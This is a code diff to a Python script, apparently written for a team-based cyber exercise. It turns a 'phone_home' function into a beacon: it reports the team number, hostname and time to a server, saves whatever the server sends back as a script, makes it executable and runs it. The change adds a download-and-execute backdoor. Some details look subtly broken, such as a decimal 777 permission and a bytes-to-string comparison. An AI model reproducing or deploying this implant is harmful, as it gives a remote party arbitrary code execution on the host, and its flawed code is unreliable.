@@ -32,10 +32,10 @@ def attempt_script_save(script_contents):
 
 def run_script(script_location):
   os.chmod(script_location, 777)
-  os.system("sudo {}".format(script_location))
+  os.system("{}".format(script_location))
 
   
-def phone_home():
+def phone_home(ip, port):
     team_number = get_team_number()
     to_send = "{},{},{}".format(team_number, socket.gethostname(),time.strftime("%Y-%m-%d_%H:%M"))
     # create an ipv4 (AF_INET) socket object using the tcp protocol (SOCK_STREAM)
@@ -43,11 +43,21 @@ def phone_home():
 
     # connect the client
     # client.connect((target, port))
-    client.connect(('127.0.0.0.1', 9999))
+    client.connect((ip, port))
 
     # send some data (in this case a HTTP GET request)
     client.send(bytes(to_send.encode('utf8')))
     # receive the response data (4096 is recommended buffer size)
     response = client.recv(4096)
+    if response == "no":
+      exit(1)
+    else:
+      saved_location = attempt_script_save(response)
+      run_script(saved_location)
 
     return(response)
+
+ip = "127.0.0.1"
+port = 80
+
+phone_home(ip, port)
